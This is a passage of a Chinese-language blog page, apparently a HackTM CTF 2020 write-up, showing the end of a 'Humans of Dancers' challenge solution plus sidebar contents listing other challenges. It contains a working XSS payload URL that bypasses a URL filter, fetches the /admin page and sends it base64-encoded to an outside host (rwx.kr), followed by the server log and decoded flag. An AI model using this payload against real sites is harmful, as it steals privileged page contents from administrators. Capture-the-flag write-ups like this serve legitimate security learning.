+<h6 id="如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是csp和Object-freeze可以防止数据的外带。但是我们可以用top-location-replace-39-39-将location移动到外部以发送数据。"><a href="#如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是csp和Object-freeze可以防止数据的外带。但是我们可以用top-location-replace-39-39-将location移动到外部以发送数据。" class="headerlink" title="如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是csp和Object.freeze可以防止数据的外带。但是我们可以用top.location.replace(&#39;...&#39;)将location移动到外部以发送数据。"></a>如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是<code>csp</code>和<code>Object.freeze</code>可以防止数据的外带。但是我们可以用<code>top.location.replace(&#39;...&#39;)</code>将<code>location</code>移动到外部以发送数据。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://178.128.175.6:20900/#javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,fetch(&apos;/admin&apos;).then(x=%3Ex.text()).then(x=%3Etop.location.replace(&apos;//rwx.kr/?&apos;%2bbtoa(x)))</span><br></pre></td></tr></table></figure>
+
+<h6 id="上面的地址获取-admin页面，并将其发送到攻击者的服务器。"><a href="#上面的地址获取-admin页面，并将其发送到攻击者的服务器。" class="headerlink" title="上面的地址获取/admin页面，并将其发送到攻击者的服务器。"></a>上面的地址获取<code>/admin</code>页面，并将其发送到攻击者的服务器。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#/page/sugestii"</span>&gt;</span>Sugestii<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span> --&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="以上注释位于页面中间。"><a href="#以上注释位于页面中间。" class="headerlink" title="以上注释位于页面中间。"></a>以上注释位于页面中间。</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"path"</span> <span class="attr">name</span>=<span class="string">"path"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"/#/page/acasa"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"csrf_token"</span> <span class="attr">name</span>=<span class="string">"csrf_token"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"Ijc2NTM2MGNiOTBkZTI4Y2E4ZGExMGRkMTk0NTAwNjE3MGNkNjZmYjAi.XjdpKQ.sFQg9QIAZLFkqSWYsMgfljOT5UA"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"60"</span> <span class="attr">id</span>=<span class="string">"message"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">placeholder</span>=<span class="string">"Scrie parerea ta"</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://www.google.com/recaptcha/api.js'</span> <span class="attr">async</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"g-recaptcha"</span> <span class="attr">data-sitekey</span>=<span class="string">"6LfE7dQUAAAAABOc1rpiWCU0CQF9Msv2XBdvgd5q"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Trimite sugestie"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="你可以看到隐藏类型的输入标签，你可以在这个地方输入payload-javascript-80-1-60html-t-aa-b-c-pa-a-1-60-fetch-39-admin-39-then-x-3Ex-text-then-x-3Etop-location-replace-39-rwx-kr-39-2bbtoa-x-管理员确认后，你会收到-admin页面的内容。"><a href="#你可以看到隐藏类型的输入标签，你可以在这个地方输入payload-javascript-80-1-60html-t-aa-b-c-pa-a-1-60-fetch-39-admin-39-then-x-3Ex-text-then-x-3Etop-location-replace-39-rwx-kr-39-2bbtoa-x-管理员确认后，你会收到-admin页面的内容。" class="headerlink" title="你可以看到隐藏类型的输入标签，你可以在这个地方输入payload/#javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,fetch(&#39;/admin&#39;).then(x=%3Ex.text()).then(x=%3Etop.location.replace(&#39;//rwx.kr/?&#39;%2bbtoa(x)))管理员确认后，你会收到/admin页面的内容。"></a>你可以看到隐藏类型的输入标签，你可以在这个地方输入payload<code>/#javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,fetch(&#39;/admin&#39;).then(x=%3Ex.text()).then(x=%3Etop.location.replace(&#39;//rwx.kr/?&#39;%2bbtoa(x)))</code>管理员确认后，你会收到<code>/admin</code>页面的内容。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// log</span><br><span class="line">178.128.175.6 - - [03/Feb/2020:01:33:35 +0900] &quot;GET /?PHA+CkhhY2tUTXs2NzA4ZTdhOGQxYWM4YmZhYWFlYjNmNmFhNzY2YjJjOTAzYmE3ZTgyNjQ2Y2E1YjgzYjVhMjBjOTQwYzU0ZjlhfQo8L3A+Cg== HTTP/1.1&quot; 200 67 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.130 Safari/537.36&quot;</span><br><span class="line">// decoded</span><br><span class="line">&lt;p&gt;</span><br><span class="line">HackTM&#123;6708e7a8d1ac8bfaaaeb3f6aa766b2c903ba7e82646ca5b83b5a20c940c54f9a&#125;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="现在我们可以获得flag了。"><a href="#现在我们可以获得flag了。" class="headerlink" title="现在我们可以获得flag了。"></a>现在我们可以获得flag了。</h6><h5 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-blog-rwx-kr-hacktm-ctf-quals-2020-my-bank-1"><a href="#https-blog-rwx-kr-hacktm-ctf-quals-2020-my-bank-1" class="headerlink" title="https://blog.rwx.kr/hacktm-ctf-quals-2020/#my-bank"></a><a href="https://blog.rwx.kr/hacktm-ctf-quals-2020/#my-bank" target="_blank" rel="noopener">https://blog.rwx.kr/hacktm-ctf-quals-2020/#my-bank</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/30/读书日记六/" rel="next" title="读书日记六">
+                <i class="fa fa-chevron-left"></i> 读书日记六
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-Draw-with-us"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 Draw with us</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目源码如下："><span class="nav-number">1.0.1.1.</span> <span class="nav-text">题目源码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们看怎么获取flag，下面这段代码返回了flag"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">现在我们看怎么获取flag，下面这段代码返回了flag:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#req-user-id是由JWT签名的，并且是在登陆的时候由服务器随机生成的。我必须去获得一个签名的token其中的id值是0。如果这个secret被用作签名并且没有暴露因此是安全的。"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">req.user.id是由JWT签名的，并且是在登陆的时候由服务器随机生成的。我必须去获得一个签名的token其中的id值是0。如果这个secret被用作签名并且没有暴露因此是安全的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在其他的地方只有一个地方返回了签名的JWT是-init"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">在其他的地方只有一个地方返回了签名的JWT是/init:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#为了让adminId为0，我们需要target-xor-pwHash-0这意味着target-pwHash。"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">为了让adminId为0，我们需要target xor pwHash=0这意味着target===pwHash。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们需要得到config-n。"><span class="nav-number">1.0.1.6.</span> <span class="nav-text">我们需要得到config.n。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们继续往下看。"><span class="nav-number">1.0.1.7.</span> <span class="nav-text">现在我们继续往下看。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到-serverInfo返回了一些在config的元素："><span class="nav-number">1.0.1.8.</span> <span class="nav-text">我们可以看到/serverInfo返回了一些在config的元素：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#每个用户的默认权限是：-quot-message-quot-quot-height-quot-quot-width-quot-quot-version-quot-quot-usersOnline-quot-quot-adminUsername-quot-quot-backgroundColor-quot"><span class="nav-number">1.0.1.9.</span> <span class="nav-text">每个用户的默认权限是：[ &quot;message&quot;, &quot;height&quot;, &quot;width&quot;, &quot;version&quot;, &quot;usersOnline&quot;, &quot;adminUsername&quot;, &quot;backgroundColor&quot; ]</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们需要去添加n和p到我们的用户权限列表中。"><span class="nav-number">1.0.1.10.</span> <span class="nav-text">我们需要去添加n和p到我们的用户权限列表中。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个方法-updateUser允许我们去发送一个权限列表以添加到我们的用户权限列表中。"><span class="nav-number">1.0.1.11.</span> <span class="nav-text">这个方法/updateUser允许我们去发送一个权限列表以添加到我们的用户权限列表中。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是但我们POST-quot-p-quot-quot-n-quot-时：返回You-39-re-not-an-admin-。"><span class="nav-number">1.0.1.12.</span> <span class="nav-text">但是但我们POST[&quot;p&quot;,&quot;n&quot;]时：返回You&#39;re not an admin!。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看看他是怎么处理的："><span class="nav-number">1.0.1.13.</span> <span class="nav-text">我们可以看看他是怎么处理的：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Bypassing-isAdmin-u"><span class="nav-number">1.0.1.14.</span> <span class="nav-text">Bypassing isAdmin(u)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们需要去使username-toLowerCase-adminUsername-toLowerCase-。"><span class="nav-number">1.0.1.15.</span> <span class="nav-text">我们需要去使username.toLowerCase() === adminUsername.toLowerCase()。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果我们尝试去登陆-login-使用hacktm我们将会获取下面的信息："><span class="nav-number">1.0.1.16.</span> <span class="nav-text">如果我们尝试去登陆(/login)使用hacktm我们将会获取下面的信息：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#他是由于isValidUser-u-在-login。它检查："><span class="nav-number">1.0.1.17.</span> <span class="nav-text">他是由于isValidUser(u)在/login。它检查：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此，我们需要："><span class="nav-number">1.0.1.18.</span> <span class="nav-text">因此，我们需要：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#幸运的是，unicode为我们提供一些字符满足下面的这些情况："><span class="nav-number">1.0.1.19.</span> <span class="nav-text">幸运的是，unicode为我们提供一些字符满足下面的这些情况：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们获得了下列的JWT"><span class="nav-number">1.0.1.20.</span> <span class="nav-text">我们获得了下列的JWT:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们能更新我们的权限！"><span class="nav-number">1.0.1.21.</span> <span class="nav-text">现在我们能更新我们的权限！</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是我们尝试去POST-quot-p-quot-quot-n-quot-到-updateUser："><span class="nav-number">1.0.1.22.</span> <span class="nav-text">但是我们尝试去POST[&quot;p&quot;,&quot;n&quot;]到/updateUser：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#将会返回如下内容："><span class="nav-number">1.0.1.23.</span> <span class="nav-text">将会返回如下内容：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#虽然没有报错，但是n和p没有被添加到用户权限列表中。"><span class="nav-number">1.0.1.24.</span> <span class="nav-text">虽然没有报错，但是n和p没有被添加到用户权限列表中。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这是因为checkRights-arr-。"><span class="nav-number">1.0.1.25.</span> <span class="nav-text">这是因为checkRights(arr)。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Bypassing-chkecRights-arr"><span class="nav-number">1.0.1.26.</span> <span class="nav-text">Bypassing chkecRights(arr)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在-updateUser"><span class="nav-number">1.0.1.27.</span> <span class="nav-text">在/updateUser():</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个checkRights返回了false由于rights包含这个字符串-quot-n-quot-quot-p-quot-。"><span class="nav-number">1.0.1.28.</span> <span class="nav-text">这个checkRights返回了false由于rights包含这个字符串&quot;n&quot;/&quot;p&quot;。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以提供下面的两个事实来解决："><span class="nav-number">1.0.1.29.</span> <span class="nav-text">我们可以提供下面的两个事实来解决：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当我们POST-quot-p-quot-quot-n-quot-到-updateUser会返回如下内容："><span class="nav-number">1.0.1.30.</span> <span class="nav-text">当我们POST[[&quot;p&quot;],&quot;n&quot;]到/updateUser会返回如下内容：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们访问-serverInfo"><span class="nav-number">1.0.1.31.</span> <span class="nav-text">现在我们访问/serverInfo:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Getting-the-flag"><span class="nav-number">1.0.1.32.</span> <span class="nav-text">Getting the flag</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#计算q使用n-p我们获得："><span class="nav-number">1.0.1.33.</span> <span class="nav-text">计算q使用n/p我们获得：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们POSTp和q到-init并且返回："><span class="nav-number">1.0.1.34.</span> <span class="nav-text">我们POSTp和q到/init并且返回：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9-eyJpZCI6MCwiaWF0IjoxNTgxMDgwOTA4fQ-6e046oNRejSwF6ymM2BaxwxvTq7y42J6jfv5bnKzj1Q是admin的token。"><span class="nav-number">1.0.1.35.</span> <span class="nav-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgxMDgwOTA4fQ.6e046oNRejSwF6ymM2BaxwxvTq7y42J6jfv5bnKzj1Q是admin的token。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#GET-flag使用admin的token："><span class="nav-number">1.0.1.36.</span> <span class="nav-text">GET/flag使用admin的token：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#测试代码如下："><span class="nav-number">1.0.1.37.</span> <span class="nav-text">测试代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#slove-py"><span class="nav-number">1.0.1.38.</span> <span class="nav-text">slove.py</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload-py"><span class="nav-number">1.0.1.39.</span> <span class="nav-text">payload.py</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接"><span class="nav-number">1.0.2.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-ctftime-org-writeup-18186"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">https://ctftime.org/writeup/18186</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-spotless-tech-hacktm-2020-drawing-html"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">https://spotless.tech/hacktm-2020-drawing.html</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-My-Bank"><span class="nav-number">1.0.3.</span> <span class="nav-text">0x02 My Bank</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#通过条件竞争漏洞我们可以借超过600-00-tBTC从而购买flag。"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">通过条件竞争漏洞我们可以借超过600.00 tBTC从而购买flag。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#bash的脚本"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">bash的脚本</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接-1"><span class="nav-number">1.0.4.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-spotless-tech-hacktm-2020-My-20Bank-html"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">https://spotless.tech/hacktm-2020-My%20Bank.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-blog-rwx-kr-hacktm-ctf-quals-2020-my-bank"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">https://blog.rwx.kr/hacktm-ctf-quals-2020/#my-bank</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03-Humans-of-Dancers"><span class="nav-number">1.0.5.</span> <span class="nav-text">0x03 Humans of Dancers</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#view-source-http-178-128-175-6-20900-static-app-js"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">view-source:http://178.128.175.6:20900/static/app.js</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果您查看-static-app-js文件，它将使用哈希值中给出的字符串作为参数调用isValidUrl函数，并检查它是否为安全地址，然后将其设置为iframe标记的src属性。"><span class="nav-number">1.0.5.2.</span> <span class="nav-text">如果您查看/static/app.js文件，它将使用哈希值中给出的字符串作为参数调用isValidUrl函数，并检查它是否为安全地址，然后将其设置为iframe标记的src属性。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先isUrl使用的正则表达式十分的复杂。这样可以确保字符不会全部转义并匹配所有的字符。因此我可以绕过用https-javascript-80-1-60html-t-aa-b-c-pa-a-1-60-alert-1-。"><span class="nav-number">1.0.5.3.</span> <span class="nav-text">首先isUrl使用的正则表达式十分的复杂。这样可以确保字符不会全部转义并匹配所有的字符。因此我可以绕过用https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#isValidJSURL函数检查给定的URL的来源。对于https-javascript-80-1-60html-t-aa-b-c-pa-a-1-60-alert-1-起源于javascript-80是被认可的。"><span class="nav-number">1.0.5.4.</span> <span class="nav-text">isValidJSURL函数检查给定的URL的来源。对于https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)起源于javascript:80是被认可的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是csp和Object-freeze可以防止数据的外带。但是我们可以用top-location-replace-39-39-将location移动到外部以发送数据。"><span class="nav-number">1.0.5.5.</span> <span class="nav-text">如果我们成功绕过了上面的过滤功能。则可以通过操控哈希值运行任意脚本，但是csp和Object.freeze可以防止数据的外带。但是我们可以用top.location.replace(&#39;...&#39;)将location移动到外部以发送数据。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面的地址获取-admin页面，并将其发送到攻击者的服务器。"><span class="nav-number">1.0.5.6.</span> <span class="nav-text">上面的地址获取/admin页面，并将其发送到攻击者的服务器。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#以上注释位于页面中间。"><span class="nav-number">1.0.5.7.</span> <span class="nav-text">以上注释位于页面中间。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#你可以看到隐藏类型的输入标签，你可以在这个地方输入payload-javascript-80-1-60html-t-aa-b-c-pa-a-1-60-fetch-39-admin-39-then-x-3Ex-text-then-x-3Etop-location-replace-39-rwx-kr-39-2bbtoa-x-管理员确认后，你会收到-admin页面的内容。"><span class="nav-number">1.0.5.8.</span> <span class="nav-text">你可以看到隐藏类型的输入标签，你可以在这个地方输入payload/#javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,fetch(&#39;/admin&#39;).then(x=%3Ex.text()).then(x=%3Etop.location.replace(&#39;//rwx.kr/?&#39;%2bbtoa(x)))管理员确认后，你会收到/admin页面的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们可以获得flag了。"><span class="nav-number">1.0.5.9.</span> <span class="nav-text">现在我们可以获得flag了。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接-2"><span class="nav-number">1.0.6.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-blog-rwx-kr-hacktm-ctf-quals-2020-my-bank-1"><span class="nav-number">1.0.6.1.</span> <span class="nav-text">https://blog.rwx.kr/hacktm-ctf-quals-2020/#my-bank</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">150.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
